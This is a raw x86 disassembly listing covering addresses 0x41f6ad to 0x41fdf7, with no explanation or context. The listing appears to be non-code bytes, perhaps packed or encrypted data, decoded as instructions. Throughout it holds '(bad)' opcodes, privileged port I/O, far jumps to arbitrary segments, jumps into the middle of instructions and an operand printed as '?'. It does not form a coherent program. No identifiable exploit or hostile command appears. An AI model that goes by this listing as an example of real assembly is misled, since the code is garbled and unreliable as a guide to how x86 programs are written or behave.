  41f6ad:	js     0x41f718
  41f6af:	mov    bh,BYTE PTR [ebx+eax*8-0xd]
  41f6b3:	(bad)  
  41f6b4:	cdq    
  41f6b5:	jmp    0x6ca8:0x69c4bfa1
  41f6bc:	cdq    
  41f6bd:	jg     0x41f66e
  41f6bf:	xchg   ebx,eax
  41f6c0:	test   al,0x98
  41f6c2:	push   es
  41f6c3:	push   eax
  41f6c4:	add    BYTE PTR [ebx-0x6e],ah
  41f6c7:	inc    esi
  41f6c8:	jge    0x41f654
  41f6ca:	and    eax,0x9b993751
  41f6cf:	jmp    0x8731dc00
  41f6d4:	mov    ds:0x72a0d535,eax
  41f6d9:	cmp    DWORD PTR [ecx+edx*2-0xa],eax
  41f6dd:	fstp   DWORD PTR [edx+0x4f]
  41f6e0:	sub    edi,DWORD PTR [edi+0x59b6e2ea]
  41f6e6:	and    DWORD PTR [ebx+0x12],0xb3f15db5
  41f6ed:	test   al,0xd
  41f6ef:	sub    al,0xbe
  41f6f1:	retf   
  41f6f2:	lods   eax,DWORD PTR ds:[esi]
  41f6f3:	pop    ss
  41f6f4:	fisttp WORD PTR [esi-0x11]
  41f6f7:	mov    ds:0xa34b7a1c,eax
  41f6fc:	push   eax
  41f6fd:	popa   
  41f6fe:	dec    esi
  41f6ff:	jns    0x41f682
  41f701:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f702:	inc    eax
  41f703:	enter  0xb438,0xa1
  41f707:	mov    WORD PTR ds:0xcbe1a5a1,ss
  41f70d:	sub    BYTE PTR [ebx],dh
  41f70f:	aaa    
  41f710:	mov    ah,0xbc
  41f712:	xchg   ecx,eax
  41f713:	out    0xdb,al
  41f715:	cwde   
  41f716:	retf   0x94fb
  41f719:	xchg   ecx,eax
  41f71a:	push   ds
  41f71b:	fs xchg edi,eax
  41f71d:	sub    DWORD PTR [eax+edi*4+0x7b31d4a],eax
  41f724:	xor    dl,BYTE PTR [esi+edx*2-0x3e1b3b36]
  41f72b:	cmp    BYTE PTR [esi],0x45
  41f72e:	inc    edx
  41f72f:	in     eax,dx
  41f730:	cwde   
  41f731:	add    eax,0xf74fe38
  41f736:	sub    edi,eax
  41f738:	push   eax
  41f739:	xchg   edx,eax
  41f73a:	add    dl,bh
  41f73c:	xor    cl,al
  41f73e:	push   eax
  41f73f:	jb     0x41f7b0
  41f741:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f742:	jne    0x41f75b
  41f744:	mov    ds:0x6ac18bc0,eax
  41f749:	pop    edi
  41f74a:	xlat   BYTE PTR ds:[ebx]
  41f74b:	push   esp
  41f74c:	xor    al,0xb1
  41f74e:	push   cs
  41f74f:	in     al,dx
  41f750:	jno    0x41f767
  41f752:	in     eax,dx
  41f753:	fstp   TBYTE PTR [ecx]
  41f755:	pop    esp
  41f756:	adc    al,bl
  41f758:	jnp    0x41f720
  41f75a:	xchg   edi,eax
  41f75b:	icebp  
  41f75c:	xor    eax,0x78c475ea
  41f761:	and    ecx,DWORD PTR [ebx+0x57147993]
  41f767:	push   ss
  41f768:	dec    eax
  41f769:	(bad)  
  41f76b:	fdiv   DWORD PTR [ebp-0x6ecc8ba0]
  41f771:	xchg   ebx,eax
  41f772:	pop    esi
  41f773:	punpckhbw mm5,QWORD PTR [edx-0x18]
  41f777:	loope  0x41f773
  41f779:	add    DWORD PTR [edx+0xf],eax
  41f77c:	pop    esp
  41f77d:	sub    ebp,DWORD PTR [edx]
  41f77f:	(bad)  
  41f780:	pushf  
  41f781:	rol    BYTE PTR [edx],1
  41f783:	gs out dx,eax
  41f785:	stos   DWORD PTR es:[edi],eax
  41f786:	jmp    0xc71a:0x7908fe46
  41f78d:	cmp    esp,DWORD PTR [esi+esi*2-0x36]
  41f791:	mov    ds:0xf3e9718,eax
  41f796:	daa    
  41f797:	adc    esi,eax
  41f799:	jle    0x41f802
  41f79b:	jge    0x41f75e
  41f79d:	push   edi
  41f79e:	dec    esp
  41f79f:	mov    bl,0x2c
  41f7a1:	es pop ds
  41f7a3:	repnz test DWORD PTR [ebx],esi
  41f7a6:	out    dx,eax
  41f7a7:	outs   dx,BYTE PTR ds:[esi]
  41f7a8:	or     ebx,esp
  41f7aa:	mov    ebx,0x773c0199
  41f7af:	in     eax,0xbc
  41f7b1:	(bad)  
  41f7b3:	jmp    0x41f7c9
  41f7b5:	mov    eax,0x4e2ace5f
  41f7ba:	loope  0x41f7a8
  41f7bc:	jle    0x41f7cd
  41f7be:	ins    DWORD PTR es:[edi],dx
  41f7bf:	enter  0x305b,0x3
  41f7c3:	arpl   WORD PTR [eax],bx
  41f7c5:	sar    bh,cl
  41f7c7:	ja     0x41f833
  41f7c9:	fcom   QWORD PTR [edi+0x6b]
  41f7cc:	sub    BYTE PTR [edx],bl
  41f7ce:	jp     0x41f847
  41f7d0:	mov    ecx,DWORD PTR [ebx+0x16e92d46]
  41f7d6:	ficom  DWORD PTR [ebx-0x5b03445e]
  41f7dc:	mov    eax,0x9b41232b
  41f7e1:	nop
  41f7e2:	int3   
  41f7e3:	lock mov ds:0x4a67048f,al
  41f7e9:	adc    BYTE PTR [esi],dh
  41f7eb:	nop
  41f7ec:	sbb    esp,ecx
  41f7ee:	sub    eax,DWORD PTR [eax+0x4d]
  41f7f1:	add    cl,BYTE PTR [edi]
  41f7f3:	mov    ebp,0x994854b6
  41f7f8:	popa   
  41f7f9:	push   eax
  41f7fa:	ins    DWORD PTR es:[edi],dx
  41f7fb:	xor    eax,0xf20db682
  41f800:	xchg   edi,eax
  41f801:	pop    es
  41f802:	cmp    esi,DWORD PTR [edi+0x6ec45631]
  41f808:	js     0x41f7f6
  41f80a:	leave  
  41f80b:	stos   DWORD PTR es:[edi],eax
  41f80c:	xchg   edi,eax
  41f80d:	sbb    esi,edx
  41f80f:	mov    ebp,DWORD PTR [edx+ebx*2+0x37]
  41f813:	cld    
  41f814:	cmp    al,0x4f
  41f816:	mov    bh,0xc1
  41f818:	ins    BYTE PTR es:[edi],dx
  41f819:	test   DWORD PTR [ebx],esp
  41f81b:	iret   
  41f81c:	jne    0x41f85e
  41f81e:	jae    0x41f7d6
  41f820:	scas   eax,DWORD PTR es:[edi]
  41f821:	out    0x97,eax
  41f823:	fmul   DWORD PTR [edx+0x31]
  41f826:	add    ecx,DWORD PTR [ebx+0x6fc53bbb]
  41f82c:	outs   dx,BYTE PTR ds:[esi]
  41f82d:	loope  0x41f879
  41f82f:	dec    edi
  41f830:	pop    ebp
  41f831:	lds    esi,FWORD PTR [edx+0x4a]
  41f834:	je     0x41f84f
  41f836:	sub    eax,0x611a1202
  41f83b:	out    dx,eax
  41f83c:	mov    dl,0xaf
  41f83e:	xchg   ecx,eax
  41f83f:	pop    ebp
  41f840:	add    bh,BYTE PTR [edx-0x1f]
  41f843:	std    
  41f844:	jle    0x41f82c
  41f846:	cmp    BYTE PTR [esi-0x15],0x66
  41f84a:	xchg   edi,eax
  41f84b:	push   ebx
  41f84c:	inc    edx
  41f84d:	jo     0x41f7f3
  41f84f:	inc    ebp
  41f850:	mov    al,ds:0x31f6604f
  41f855:	pop    ds
  41f856:	bound  ebx,QWORD PTR [ebx-0x37905d4f]
  41f85c:	fisub  DWORD PTR [edx+esi*8+0x34]
  41f860:	xor    edi,ebx
  41f862:	add    ebp,esp
  41f864:	test   eax,0x25d7094e
  41f869:	(bad)  
  41f86a:	sub    edi,ecx
  41f86c:	pushf  
  41f86d:	mov    esp,0xd5ea104
  41f872:	adc    al,0xb2
  41f874:	imul   eax,DWORD PTR [eax+0x431c16dc],0xdf8af5c8
  41f87e:	adc    BYTE PTR [esp+esi*4+0x67adf258],ch
  41f885:	xor    al,0xbc
  41f887:	or     DWORD PTR [esi+0x44a7bd3c],edx
  41f88d:	xchg   ebp,edx
  41f88f:	mov    bh,0x72
  41f891:	push   cs
  41f892:	cmp    BYTE PTR [edx-0x1bb0761e],bh
  41f898:	push   ds
  41f899:	retf   
  41f89a:	ins    BYTE PTR es:[edi],dx
  41f89b:	stos   DWORD PTR es:[edi],eax
  41f89c:	push   ebp
  41f89d:	shr    edi,1
  41f89f:	retf   0x9d73
  41f8a2:	ja     0x41f909
  41f8a4:	cwde   
  41f8a5:	inc    ecx
  41f8a6:	sub    al,0x85
  41f8a8:	(bad)  
  41f8a9:	cmp    al,0x22
  41f8ab:	mov    al,ds:0xf43bb6dc
  41f8b0:	loope  0x41f8c1
  41f8b2:	ss movaps xmm7,xmm1
  41f8b6:	lds    eax,FWORD PTR [esi-0x38]
  41f8b9:	fadd   QWORD PTR [edi+ebx*1]
  41f8bc:	pop    ecx
  41f8bd:	enter  0xddc8,0x26
  41f8c1:	push   ebx
  41f8c2:	pop    ecx
  41f8c3:	mul    BYTE PTR [esp+edi*8+0x72]
  41f8c7:	sahf   
  41f8c8:	push   ebx
  41f8c9:	bnd jle 0x41f8aa
  41f8cc:	xchg   edi,eax
  41f8cd:	jle    0x41f930
  41f8cf:	sub    DWORD PTR [ebp+0x4bde0cf5],0xe34d7d3
  41f8d9:	dec    ecx
  41f8da:	dec    esi
  41f8db:	jp     0x41f8d8
  41f8dd:	xor    BYTE PTR [edi],al
  41f8df:	icebp  
  41f8e0:	sub    BYTE PTR [ebx+eiz*1],bh
  41f8e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f8e4:	les    eax,FWORD PTR [edi]
  41f8e6:	mov    BYTE PTR [eax+0x0],ah
  41f8e9:	mov    cs,esp
  41f8eb:	dec    bx
  41f8ed:	jl     0x41f8a8
  41f8ef:	push   0x88562ad2
  41f8f4:	jno    0x41f89d
  41f8f6:	push   esp
  41f8f7:	sar    BYTE PTR [esi+0x4f],0xae
  41f8fb:	sub    eax,0xe622ae14
  41f900:	lds    esp,FWORD PTR [esi+0x36]
  41f903:	call   0xd5bc848
  41f908:	mov    es,eax
  41f90a:	and    DWORD PTR [ebx],0x698a1f8a
  41f910:	out    0x95,al
  41f912:	inc    edi
  41f913:	inc    edx
  41f914:	enter  0x32cf,0x11
  41f918:	mov    ebp,edi
  41f91a:	xor    esi,DWORD PTR [eax]
  41f91c:	dec    edx
  41f91d:	ret    
  41f91e:	aaa    
  41f91f:	jae    0x41f8bd
  41f921:	add    eax,0x70384678
  41f926:	adc    dl,cl
  41f928:	std    
  41f929:	int    0xe2
  41f92b:	push   edx
  41f92c:	adc    BYTE PTR [ebp+0x480738f8],cl
  41f932:	mov    bl,0x93
  41f934:	(bad)  
  41f935:	fcmove st,st(7)
  41f937:	mov    al,0x44
  41f939:	into   
  41f93a:	mov    ah,0xf8
  41f93c:	fs jne 0x41f99a
  41f93f:	sub    eax,0x291ba94d
  41f944:	loope  0x41f8d2
  41f946:	xchg   bl,ch
  41f948:	inc    ebp
  41f949:	push   0x273b9ddf
  41f94e:	mov    eax,0x47e6a2bc
  41f953:	scas   eax,DWORD PTR es:[edi]
  41f954:	and    cl,dl
  41f956:	mov    esp,0xb2e5ccc3
  41f95b:	cmp    esp,DWORD PTR [eax]
  41f95d:	inc    ebx
  41f95e:	dec    ebp
  41f95f:	or     eax,ebp
  41f961:	mov    esp,0x4ff83288
  41f966:	(bad)  
  41f967:	cli    
  41f968:	mov    dh,0x70
  41f96a:	jmp    0x3747:0x851cba27
  41f971:	sub    al,0x5d
  41f973:	scas   al,BYTE PTR es:[edi]
  41f974:	mov    dl,0x65
  41f976:	imul   esi,esi,0x35ec091f
  41f97c:	into   
  41f97d:	jecxz  0x41f900
  41f97f:	ss push ecx
  41f981:	dec    esi
  41f982:	mov    al,fs:0x3c248a34
  41f988:	or     DWORD PTR [esi],esi
  41f98a:	and    eax,0x5f4ded09
  41f98f:	inc    esi
  41f990:	pop    esp
  41f991:	mov    dl,0x24
  41f993:	dec    edi
  41f994:	push   edi
  41f995:	hlt    
  41f996:	push   es
  41f997:	mov    WORD PTR [ecx-0xeebbfe7],ds
  41f99d:	mov    dl,0x5b
  41f99f:	sbb    ecx,edi
  41f9a1:	es icebp 
  41f9a3:	sub    bl,BYTE PTR [ecx+0x76]
  41f9a6:	sbb    DWORD PTR [esi],ebp
  41f9a8:	pop    es
  41f9a9:	out    dx,al
  41f9aa:	mov    ebp,0x811402e0
  41f9af:	jg     0x41f973
  41f9b1:	xor    al,ah
  41f9b3:	fidiv  WORD PTR [ebp+edx*4+0x5d]
  41f9b7:	(bad)  
  41f9b8:	jb     0x41f9ca
  41f9ba:	add    dl,bl
  41f9bc:	sbb    dh,BYTE PTR [edi-0x62]
  41f9bf:	leave  
  41f9c0:	jecxz  0x41fa1e
  41f9c2:	xchg   ebp,eax
  41f9c3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f9c4:	test   al,0x63
  41f9c6:	icebp  
  41f9c7:	mov    dl,0x8a
  41f9c9:	aas    
  41f9ca:	cmp    al,ah
  41f9cc:	sub    eax,0xa0295aae
  41f9d1:	fisttp WORD PTR [edi]
  41f9d3:	xchg   esi,eax
  41f9d4:	or     bh,BYTE PTR [ecx+0x5a]
  41f9d7:	out    dx,al
  41f9d8:	sub    eax,0x4e960775
  41f9dd:	popf   
  41f9de:	retf   
  41f9df:	lods   al,BYTE PTR ds:[esi]
  41f9e0:	(bad)
  41f9e4:	sub    ebx,DWORD PTR [ecx-0x35]
  41f9e7:	imul   edx,DWORD PTR [edx+eax*1],0xfffffff5
  41f9eb:	daa    
  41f9ec:	lods   eax,DWORD PTR ds:[esi]
  41f9ed:	lods   al,BYTE PTR ds:[esi]
  41f9ee:	push   cs
  41f9ef:	mov    ebp,0xe4c70b92
  41f9f4:	call   0x3f4ef97b
  41f9f9:	out    dx,al
  41f9fa:	jne    0x41fa70
  41f9fc:	outs   dx,BYTE PTR ds:[esi]
  41f9fd:	fcom   DWORD PTR [edi-0x14582c33]
  41fa03:	scas   al,BYTE PTR es:[edi]
  41fa04:	fidiv  WORD PTR [eax]
  41fa06:	shl    BYTE PTR [esi-0x5c1066aa],0x26
  41fa0d:	cmove  ebp,DWORD PTR [edx-0x756cb152]
  41fa14:	mov    dh,0x79
  41fa16:	pop    eax
  41fa17:	test   BYTE PTR [edx-0x70],ch
  41fa1a:	xor    BYTE PTR [esi-0x16],0xb2
  41fa1e:	(bad)  
  41fa1f:	or     eax,0xc481a2f5
  41fa24:	retf   
  41fa25:	mov    ds:0xe37108df,eax
  41fa2a:	mov    edi,0x4b942296
  41fa2f:	cld    
  41fa30:	(bad)  
  41fa31:	xchg   esi,eax
  41fa32:	inc    eax
  41fa34:	cmp    al,0x5c
  41fa36:	lods   eax,DWORD PTR ds:[esi]
  41fa37:	push   edi
  41fa38:	je     0x41fa3d
  41fa3a:	fisttp DWORD PTR [edx-0x45]
  41fa3d:	cdq    
  41fa3e:	mov    ecx,DWORD PTR [esp+ebp*8-0x69763654]
  41fa45:	xchg   ebp,eax
  41fa46:	mov    dh,0x41
  41fa48:	nop
  41fa49:	lds    ebx,FWORD PTR [ebp-0x17b8503e]
  41fa4f:	aam    0x9e
  41fa51:	cs push eax
  41fa53:	sbb    eax,0xc4d17c0a
  41fa58:	push   ebp
  41fa59:	sbb    BYTE PTR [edi+0x25bd0e21],bh
  41fa5f:	aam    0x7b
  41fa61:	std    
  41fa62:	bound  edx,QWORD PTR [edx]
  41fa64:	fisubr WORD PTR [esp+eiz*2]
  41fa67:	sub    edi,DWORD PTR [ebx+0x29334dab]
  41fa6d:	jmp    0xff33:0x3a439131
  41fa74:	adc    BYTE PTR [ebx+0x77],0x2a
  41fa78:	add    ecx,DWORD PTR [esi+0x34]
  41fa7b:	cmc    
  41fa7c:	xor    bh,bl
  41fa7e:	mov    al,ds:0x31103b73
  41fa83:	stc    
  41fa84:	(bad)  [edx-0x4982ea4c]
  41fa8a:	jne    0x41fa20
  41fa8c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fa8d:	inc    esi
  41fa8e:	rcl    BYTE PTR [esi-0x69463ed3],1
  41fa94:	in     eax,dx
  41fa95:	or     DWORD PTR [ebp+0x54],ebp
  41fa98:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fa99:	or     esi,0xb031ab39
  41fa9f:	dec    ecx
  41faa0:	cmc    
  41faa1:	dec    esp
  41faa2:	xchg   esp,eax
  41faa3:	xchg   BYTE PTR [esi],dh
  41faa5:	bound  ebp,QWORD PTR ds:[edx]
  41faa8:	out    0x44,eax
  41faaa:	jo     0x41fa3d
  41faac:	mov    al,ds:0x259fedf
  41fab1:	ds fwait
  41fab3:	mov    edi,0xa226f6ae
  41fab8:	xchg   ebp,eax
  41fab9:	inc    ebp
  41faba:	sbb    al,0x56
  41fabc:	jae    0x41fa91
  41fabe:	into   
  41fabf:	cs aas 
  41fac1:	or     DWORD PTR [edi],eax
  41fac3:	loop   0x41fb3b
  41fac5:	jl     0x41facd
  41fac7:	dec    ecx
  41fac8:	push   cs
  41fac9:	dec    edx
  41faca:	fxam   
  41facc:	push   cs
  41facd:	test   al,0x69
  41facf:	outs   dx,DWORD PTR ds:[esi]
  41fad0:	xchg   ecx,eax
  41fad1:	or     DWORD PTR [ebp+0x6d9a062e],ebx
  41fad7:	add    bl,BYTE PTR [ecx+0x44]
  41fada:	(bad)  
  41fadc:	pop    edi
  41fadd:	mov    edx,0x97fb2d4d
  41fae2:	adc    eax,0x20c56a58
  41fae7:	mov    edi,0x1dea8809
  41faec:	gs add al,0xc1
  41faef:	jns    0x41fa86
  41faf1:	dec    edx
  41faf2:	arpl   WORD PTR [ebp+ebx*1+0xfc3cc75],dx
  41faf9:	sub    eax,ebp
  41fafb:	cmp    DWORD PTR [ecx+0xd],ebp
  41fafe:	stc    
  41faff:	shr    DWORD PTR [edi+eax*1],cl
  41fb02:	jle    0x41fb54
  41fb04:	out    0xc0,al
  41fb06:	(bad)  
  41fb07:	imul   ebp,DWORD PTR [edx+0x7b],0xffffffed
  41fb0b:	(bad)  
  41fb0c:	adc    BYTE PTR [eax],ch
  41fb0e:	inc    esp
  41fb0f:	cmp    cl,dh
  41fb11:	pushf  
  41fb12:	sub    al,0x5d
  41fb14:	or     eax,0x93874bfb
  41fb19:	inc    ebx
  41fb1a:	jp     0x41fb1a
  41fb1c:	lds    ebp,FWORD PTR [esi*8+0x2f93677]
  41fb23:	rcl    BYTE PTR [edi+0x3139990d],cl
  41fb29:	inc    edx
  41fb2a:	aam    0x30
  41fb2c:	mov    eax,0x9715cea5
  41fb31:	dec    edi
  41fb32:	rol    BYTE PTR [edi+0x347481ed],cl
  41fb38:	sub    ch,BYTE PTR [ecx+0x62272661]
  41fb3e:	popf   
  41fb3f:	lds    ecx,FWORD PTR [ebp-0x1ccb218b]
  41fb45:	lahf   
  41fb46:	dec    ebp
  41fb47:	test   eax,0x8bf4ba9c
  41fb4c:	xor    bh,BYTE PTR [edi+0x47]
  41fb4f:	mov    dl,0xf5
  41fb51:	lock js 0x41fbaf
  41fb54:	sub    BYTE PTR [esi+edi*8-0x68f5d887],ch
  41fb5b:	lahf   
  41fb5c:	stc    
  41fb5d:	xlat   BYTE PTR ds:[ebx]
  41fb5e:	or     edx,esi
  41fb60:	adc    ch,BYTE PTR [ebp-0x12]
  41fb63:	sbb    al,0x4d
  41fb65:	push   esi
  41fb66:	jne    0x41fb99
  41fb68:	cmp    dh,BYTE PTR [esi-0x50]
  41fb6b:	imul   esp,ebx,0x6a
  41fb6e:	dec    edx
  41fb6f:	addr16 pusha 
  41fb71:	xor    dl,bh
  41fb73:	ins    BYTE PTR es:[edi],dx
  41fb74:	add    al,0xc3
  41fb76:	(bad)
  41fb79:	rcr    DWORD PTR [esi],0xc8
  41fb7c:	loop   0x41fb2c
  41fb7e:	cmp    ecx,DWORD PTR [ecx-0x41a40569]
  41fb84:	jmp    DWORD PTR [edi]
  41fb86:	cmp    al,0x26
  41fb88:	ds pushf 
  41fb8a:	mov    bl,0xd7
  41fb8c:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fb8e:	addr16 mov bl,0xcb
  41fb91:	fwait
  41fb92:	mov    BYTE PTR [ebp-0x6a],ch
  41fb95:	int3   
  41fb96:	sbb    eax,DWORD PTR [esi+esi*2+0x7a]
  41fb9a:	xor    DWORD PTR [edx+0x49ec2907],0xffffff85
  41fba1:	das    
  41fba2:	lea    edi,[ebx+0x5f454d67]
  41fba8:	sbb    eax,0xd5c6a458
  41fbad:	pop    ecx
  41fbae:	inc    esp
  41fbaf:	(bad)  
  41fbb0:	fisubr WORD PTR [ecx+0x3bb07b9e]
  41fbb6:	imul   ecx,ebp,0xb03f29bd
  41fbbc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fbbd:	inc    ebx
  41fbbe:	xchg   ecx,eax
  41fbbf:	or     edx,DWORD PTR [ecx+eiz*4-0x3]
  41fbc3:	or     BYTE PTR [eax],0x46
  41fbc6:	sbb    esp,0x385ddc20
  41fbcc:	test   BYTE PTR [edx-0x3d],0x60
  41fbd0:	ds ins DWORD PTR es:[edi],dx
  41fbd2:	mov    ebx,0x5770ab73
  41fbd7:	cld    
  41fbd8:	and    DWORD PTR [eax],esp
  41fbda:	sbb    eax,0x211cf96
  41fbdf:	sbb    eax,0x694d3af5
  41fbe4:	cwde   
  41fbe5:	or     DWORD PTR [edi+0xb],esp
  41fbe8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fbe9:	stos   BYTE PTR es:[edi],al
  41fbea:	or     dl,BYTE PTR [eax-0x27383121]
  41fbf0:	out    dx,al
  41fbf1:	ja     0x41fb92
  41fbf3:	cdq    
  41fbf4:	mov    cl,0x61
  41fbf6:	loopne 0x41fbef
  41fbf8:	and    eax,0xf7e1f586
  41fbfd:	loope  0x41fc0f
  41fbff:	data16 std 
  41fc01:	xor    BYTE PTR [ecx],dl
  41fc03:	ins    BYTE PTR es:[edi],dx
  41fc04:	pop    ss
  41fc05:	mov    ecx,DWORD PTR [edi]
  41fc07:	jns    0x41fba6
  41fc09:	in     al,dx
  41fc0a:	sub    ebx,DWORD PTR [ebp+ebx*8+0x465b105]
  41fc11:	(bad)  
  41fc13:	mov    ebp,0x39e79e32
  41fc18:	adc    al,0x85
  41fc1a:	aas    
  41fc1b:	jle    0x41fc5b
  41fc1d:	push   es
  41fc1e:	xchg   esp,eax
  41fc1f:	cs jno 0x41fbdb
  41fc22:	stos   DWORD PTR es:[edi],eax
  41fc23:	inc    esi
  41fc24:	push   0x5720cdae
  41fc29:	or     esi,DWORD PTR [ebp-0x6b]
  41fc2c:	fldcw  WORD PTR [esi]
  41fc2e:	outs   dx,DWORD PTR ds:[esi]
  41fc2f:	inc    ebp
  41fc30:	jb     0x41fc4a
  41fc32:	adc    al,0x4
  41fc34:	iret   
  41fc35:	stc    
  41fc36:	jbe    0x41fc1e
  41fc38:	adc    dh,BYTE PTR [ebx*8+0xe4c6438]
  41fc3f:	popf   
  41fc40:	push   ebp
  41fc41:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fc42:	cmp    al,0x60
  41fc44:	leave  
  41fc45:	das    
  41fc46:	rol    DWORD PTR [ebx-0x51163405],cl
  41fc4c:	iret   
  41fc4d:	or     bh,al
  41fc4f:	daa    
  41fc50:	mov    edx,0xfdb308b9
  41fc55:	xchg   edi,eax
  41fc56:	inc    eax
  41fc57:	cmp    BYTE PTR [edi+0x18],bl
  41fc5a:	out    0x44,al
  41fc5c:	mov    ah,0x15
  41fc5e:	mov    ecx,0x438f2b9a
  41fc63:	mov    ds:0x8b83bf96,eax
  41fc68:	add    eax,0x893f581d
  41fc6d:	fstp   TBYTE PTR [eax-0x69fe4718]
  41fc73:	fwait
  41fc74:	and    ebp,ebx
  41fc76:	mov    al,0xbb
  41fc78:	scas   al,BYTE PTR es:[edi]
  41fc79:	xlat   BYTE PTR ds:[ebx]
  41fc7a:	push   ss
  41fc7b:	and    cl,cl
  41fc7d:	push   esi
  41fc7e:	sub    ah,BYTE PTR [eax-0x1b]
  41fc81:	add    edx,esi
  41fc83:	pop    esp
  41fc84:	ror    BYTE PTR [ebx+ebp*8],1
  41fc87:	pop    esp
  41fc88:	sbb    al,bh
  41fc8a:	mov    al,ds:0x81d5b357
  41fc8f:	or     al,0xdf
  41fc91:	cmp    dl,BYTE PTR [eax+0x24]
  41fc94:	std    
  41fc95:	fisubr DWORD PTR [esi-0x16]
  41fc98:	push   eax
  41fc99:	pop    es
  41fc9a:	stos   DWORD PTR es:[edi],eax
  41fc9b:	mov    esi,0x9a84fe43
  41fca0:	ja     0x41fd0a
  41fca2:	ds push esi
  41fca4:	rcr    DWORD PTR [edx+0x72],cl
  41fca7:	adc    al,0xb7
  41fca9:	in     al,0x79
  41fcab:	jge    0x41fc95
  41fcad:	fnstsw WORD PTR [ebx]
  41fcaf:	or     DWORD PTR ds:[eax],ebp
  41fcb2:	pop    DWORD PTR [edi+0x24fc66ec]
  41fcb8:	push   edi
  41fcb9:	retf   0xeb1
  41fcbc:	test   BYTE PTR [ebx],0x44
  41fcbf:	pushf  
  41fcc0:	pop    eax
  41fcc1:	ins    DWORD PTR es:[edi],dx
  41fcc2:	push   ebx
  41fcc3:	lods   eax,DWORD PTR ds:[esi]
  41fcc4:	or     eax,0x29152ca3
  41fcc9:	sbb    edi,DWORD PTR [ebx+0x41249829]
  41fccf:	xchg   sp,ax
  41fcd1:	cmp    al,BYTE PTR [esi+0x1e74e1cc]
  41fcd7:	fs inc ebx
  41fcd9:	out    0x24,al
  41fcdb:	stos   DWORD PTR es:[edi],eax
  41fcdc:	cmp    eax,0x18b475b1
  41fce1:	sub    eax,0x5d47802e
  41fce6:	and    eax,0x82a0ec1b
  41fceb:	aam    0xba
  41fced:	dec    esp
  41fcee:	es daa 
  41fcf0:	fwait
  41fcf1:	xchg   BYTE PTR [eax],ah
  41fcf3:	xchg   edi,eax
  41fcf5:	js     0x41fcf7
  41fcf7:	test   esi,ebp
  41fcf9:	mov    ebx,0x9c356f8d
  41fcfe:	and    BYTE PTR [eax],0x9f
  41fd01:	ja     0x41fd62
  41fd03:	mov    edi,0x7c2b2059
  41fd08:	mov    ebp,DWORD PTR cs:[esi+0x3eb65637]
  41fd0f:	add    DWORD PTR [ebx],edi
  41fd11:	mov    ch,BYTE PTR [ebp-0x34]
  41fd14:	xchg   edx,eax
  41fd15:	jbe    0x41fd4b
  41fd17:	sub    BYTE PTR [edx+eiz*2+0x9ed2043],bh
  41fd1e:	(bad)  
  41fd1f:	lahf   
  41fd20:	cmp    edi,DWORD PTR [ebp-0x55]
  41fd23:	jbe    0x41fce1
  41fd25:	fsubr  QWORD PTR [esi-0x7a16f382]
  41fd2b:	scas   eax,DWORD PTR es:[edi]
  41fd2c:	fcomp  QWORD PTR [ebx-0x52be74b7]
  41fd32:	cs je  0x41fd36
  41fd35:	data16 mov fs,WORD PTR [eax-0x69]
  41fd39:	or     dh,BYTE PTR ds:0x6bfcf9f5
  41fd3f:	xchg   edi,eax
  41fd40:	aad    0x60
  41fd42:	arpl   di,si
  41fd44:	jmp    0x9c63:0x4259df31
  41fd4b:	mul    esp
  41fd4d:	fstp   DWORD PTR [ebp+0x4c]
  41fd50:	outs   dx,DWORD PTR ds:[esi]
  41fd51:	cli    
  41fd52:	lods   al,BYTE PTR ds:[esi]
  41fd53:	inc    ecx
  41fd54:	ins    DWORD PTR es:[edi],dx
  41fd55:	inc    edi
  41fd56:	dec    ebp
  41fd57:	pop    ds
  41fd58:	in     al,0xd
  41fd5a:	sbb    dh,BYTE PTR [esi-0x60a57be4]
  41fd60:	iret   
  41fd61:	pop    esi
  41fd62:	cmp    DWORD PTR [edx-0x37094574],ebx
  41fd68:	fs mov edx,0xa3692bba
  41fd6e:	shl    DWORD PTR [eax],0xcd
  41fd71:	lahf   
  41fd72:	pop    eax
  41fd73:	shl    eax,0xeb
  41fd76:	fs xchg ebp,eax
  41fd78:	jmp    0x68ac51ec
  41fd7d:	test   eax,0x7ae57134
  41fd82:	inc    ebx
  41fd83:	xchg   ecx,eax
  41fd84:	mov    ecx,0x323905e5
  41fd89:	inc    ecx
  41fd8a:	sub    ch,dh
  41fd8c:	mov    cl,0x96
  41fd8e:	or     BYTE PTR [eax+0x6d4ee6f6],0x9f
  41fd95:	fchs   
  41fd97:	sti    
  41fd98:	jae    0x41fd34
  41fd9a:	xchg   edx,eax
  41fd9b:	xor    ecx,0xd
  41fd9e:	cmp    ch,BYTE PTR [esi]
  41fda0:	mov    BYTE PTR [ecx+0x4c],dl
  41fda3:	icebp  
  41fda4:	jnp    0x41fdfb
  41fda6:	in     al,0x40
  41fda8:	push   0x15c2c36c
  41fdad:	and    esi,esi
  41fdaf:	mov    ebx,0x63ea8a35
  41fdb4:	push   esi
  41fdb5:	ss mov esp,0x8ac36ac3
  41fdbb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fdbc:	je     0x41fdfe
  41fdbe:	ret    0x49a2
  41fdc1:	aaa    
  41fdc2:	push   0x1c
  41fdc4:	jp     0x41fd6a
  41fdc6:	xor    edi,DWORD PTR [ebx+0x32]
  41fdc9:	inc    esi
  41fdca:	inc    esp
  41fdcb:	mov    esi,?
  41fdcd:	fcomp  QWORD PTR [ebx]
  41fdcf:	jae    0x41fe3d
  41fdd1:	cs iret 
  41fdd3:	mov    ds:0xcd4327c2,al
  41fdd8:	xchg   esi,eax
  41fdd9:	push   ebp
  41fdda:	or     eax,0x62cf3dc1
  41fddf:	mov    edx,esp
  41fde1:	xor    DWORD PTR [eax-0x35],ebp
  41fde4:	inc    ebx
  41fde5:	into   
  41fde6:	xor    dh,BYTE PTR [esi+esi*8+0x60105450]
  41fded:	pop    DWORD PTR ds:[eax-0x199e523b]
  41fdf4:	add    bh,BYTE PTR [esi+0x44]
  41fdf7:	adc    ch,bh
